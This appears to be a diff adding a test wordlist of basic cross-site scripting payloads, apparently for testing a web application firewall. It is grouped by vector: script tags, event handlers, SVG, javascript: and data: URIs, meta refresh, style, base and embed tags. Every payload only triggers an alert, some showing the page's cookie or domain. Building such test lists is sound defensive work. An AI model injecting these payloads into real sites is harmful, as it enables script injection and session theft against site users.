@@ -1,0 +1,73 @@
+# XSS Injection Vectors - Basic
+# Cross-Site Scripting payloads for WAF testing
+
+# Basic XSS
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>alert(window.origin)</script>
+
+# Event Handler XSS
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(1)>
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<select onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<keygen onfocus=alert('XSS') autofocus>
+<video><source onerror="alert('XSS')">
+<audio src=x onerror=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<marquee onstart=alert('XSS')>
+
+# SVG XSS
+<svg onload=alert('XSS')>
+<svg><script>alert('XSS')</script></svg>
+<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>
+<svg><set onbegin=alert('XSS') attributeName=x to=0>
+
+# JavaScript Protocol
+<a href="javascript:alert('XSS')">Click</a>
+<iframe src="javascript:alert('XSS')">
+<form action="javascript:alert('XSS')">
+<object data="javascript:alert('XSS')">
+
+# Data URI XSS
+<script src="data:text/javascript,alert('XSS')"></script>
+<iframe src="data:text/html,<script>alert('XSS')</script>">
+<object data="data:text/html,<script>alert('XSS')</script>">
+
+# HTML5 XSS
+<video src=x onerror=alert('XSS')>
+<audio src=x onerror=alert('XSS')>
+<source src=x onerror=alert('XSS')>
+<track src=x onerror=alert('XSS')>
+
+# Form XSS
+<form><button formaction=javascript:alert('XSS')>Click
+<form><input formaction=javascript:alert('XSS') type=submit>
+<form><input type=submit formaction=javascript:alert('XSS')>
+
+# Link XSS
+<link rel=import href=data:text/html,<script>alert('XSS')</script>>
+<link rel=stylesheet href=data:text/css,body{background:url('javascript:alert(1)')}
+
+# Meta Refresh XSS
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
+<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert('XSS')</script>">
+
+# Style XSS
+<style>@import'javascript:alert("XSS")';</style>
+<style>body{background:url("javascript:alert('XSS')")}</style>
+<div style="background:url('javascript:alert(1)')">
+
+# Template XSS
+<template><script>alert('XSS')</script></template>
+
+# Base Tag XSS
+<base href="javascript:alert('XSS')//">
+
+# Embed XSS
+<embed src="data:text/html,<script>alert('XSS')</script>">
+<embed src="javascript:alert('XSS')">
